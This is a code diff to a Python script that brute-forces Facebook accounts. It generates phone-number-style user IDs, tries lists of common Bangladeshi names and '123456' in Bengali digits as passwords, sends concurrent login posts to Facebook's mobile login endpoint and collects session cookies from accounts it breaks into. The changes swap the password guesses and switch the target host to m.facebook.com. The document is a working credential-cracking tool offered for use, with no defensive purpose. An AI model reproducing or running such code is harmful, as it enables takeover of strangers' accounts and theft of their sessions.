@@ -227,7 +227,7 @@ def RJ_SN():
         print('\033[1;92mIF ID NOT COME TURN ON AIRPLNE')
         linex()
         for love in user:
-            pwx = [love[2:],love,code+love,code+love[:3],'jannat','sumaiya','sadiya','mehedi','sabbir','i love you','bangladesh','bangla']
+            pwx = [love[2:],love,code+love,code+love[:3],'rahman','mimmim','lamiya','jahangir','sabbir','jannatul','aklima','soniya','১২৩৪৫৬']
             uid = code+love
             manshera.submit(rcrack,uid,pwx,tl)
     print('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;90mCRACK PROCESS HAS BEEN COMPLETED ')
@@ -255,7 +255,7 @@ def rcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {"authority": 'web.facebook.com',
+            header_freefb = {"authority": 'm.facebook.com',
             "method": 'GET',
             "scheme": 'https',
             "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
@@ -275,7 +275,7 @@ def rcrack(uid,pwx,tl):
             'cross-origin-resource-policy': 'cross-origin',
             "upgrade-insecure-requests": '1',
             "user-agent": pro}
-            lo = session.post('https://web.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
+            lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
